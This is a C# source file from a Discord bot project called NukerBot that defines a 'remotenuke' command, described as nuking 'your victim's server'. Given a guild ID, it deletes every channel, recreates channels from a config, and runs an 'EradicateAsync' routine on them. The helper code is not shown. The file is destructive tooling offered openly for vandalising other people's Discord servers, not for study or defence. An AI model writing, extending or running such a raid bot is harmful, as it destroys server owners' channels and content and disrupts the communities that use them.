using DSharpPlus.CommandsNext;
using DSharpPlus.CommandsNext.Attributes;
using NukerBot.src.Utils;

namespace NukerBot.src.Modules;

public sealed class NukingModule : BaseCommandModule {
    public required Config Config { get; set; }

    [Command("remotenuke"), Aliases("rnuke")]
    [Description("This command allows you to nuke your victim's server from your own server")]
    public async Task RemoteNukeAsync(CommandContext context, ulong guildID) {
        var guild = await context.Client.GetGuildAsync(guildID);
        var oldChannels = await guild.GetChannelsAsync();

        await NukingUtils.DeleteAllChannelsAsync(oldChannels);

        var newChannels = await NukingUtils.CreateChannelsAsync(guild, Config);

        await NukingUtils.EradicateAsync(newChannels, Config);
    }
}